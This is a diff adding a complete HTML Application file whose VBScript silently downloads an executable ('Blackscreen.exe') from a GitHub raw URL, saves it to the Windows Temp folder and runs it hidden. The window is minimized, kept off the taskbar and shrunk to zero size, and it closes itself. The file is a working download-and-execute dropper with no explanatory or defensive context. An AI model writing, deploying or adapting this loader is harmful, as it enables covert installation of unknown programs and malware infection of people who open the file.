@@ -1,0 +1,21 @@
+<HTML>
+<HEAD>
+<HTA:APPLICATION SHOWINTASKBAR=no WINDOWSTATE=minimize>
+<TITLE></TITLE>
+<SCRIPT LANGUAGE="VBScript">
+Window.ResizeTo 0,0
+Set x=CreateObject("Microsoft.XMLHTTP")
+x.Open "GET","https://github.com/TheAmazingCabbage/test/raw/refs/heads/main/Blackscreen.exe",0
+x.Send
+Set s=CreateObject("ADODB.Stream")
+s.Type=1
+s.Open
+s.Write x.responseBody
+s.SaveToFile "C:\Windows\Temp\t.exe",2
+CreateObject("WScript.Shell").Run "C:\Windows\Temp\t.exe",0,False
+Window.Close
+</SCRIPT>
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
